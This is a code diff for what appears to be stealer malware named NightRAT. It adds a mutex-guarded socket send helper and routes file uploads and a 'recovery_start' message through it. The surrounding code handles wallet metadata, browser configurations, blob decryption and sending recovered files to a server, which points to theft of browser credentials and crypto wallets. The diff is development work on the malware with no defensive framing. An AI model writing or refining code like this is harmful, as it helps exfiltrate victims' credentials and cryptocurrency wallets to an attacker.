@@ -42,6 +42,25 @@ struct PacketHeader {
 static const uint16_t PACKET_SIGNATURE = 0x524E;
 static const uint8_t PACKET_TYPE_RECOVERY_FILE = 0x07;
 
+static void send_with_mutex(SOCKET sock, const char* data, int len) {
+    HANDLE hMutex = OpenMutexW(MUTEX_ALL_ACCESS, FALSE, L"Global\\NightRAT_Socket_Mutex");
+    if (hMutex) WaitForSingleObject(hMutex, INFINITE);
+
+    int remaining = len;
+    const char* p = data;
+    while (remaining > 0) {
+        int sent = send(sock, p, remaining, 0);
+        if (sent <= 0) break;
+        p += sent;
+        remaining -= sent;
+    }
+
+    if (hMutex) {
+        ReleaseMutex(hMutex);
+        CloseHandle(hMutex);
+    }
+}
+
 struct WalletMetadata {
     std::string name;
     std::string chromium_id;
@@ -87,14 +106,7 @@ void send_file_to_server(SOCKET sock, const std::string& relPath, const std::vec
             memcpy(ptr, data.data() + total_sent, current_chunk);
         }
 
-        int remaining = (int)packet.size();
-        const char* p = (const char*)packet.data();
-        while (remaining > 0) {
-            int sent = send(sock, p, remaining, 0);
-            if (sent <= 0) break;
-            p += sent;
-            remaining -= sent;
-        }
+        send_with_mutex(sock, (const char*)packet.data(), (int)packet.size());
 
         total_sent += current_chunk;
     } while (total_sent < data_size);
@@ -229,7 +241,7 @@ std::vector<uint8_t> decrypt_blob(const std::vector<uint8_t>& blob, const std::v
 void run_recovery(SOCKET sock) {
     if (sock != INVALID_SOCKET) {
         std::string start_msg = "{\"action\":\"recovery_start\"}\r\n";
-        send(sock, start_msg.c_str(), (int)start_msg.size(), 0);
+        send_with_mutex(sock, start_msg.c_str(), (int)start_msg.size());
     }
 
     std::vector<BrowserConfig> configs = {
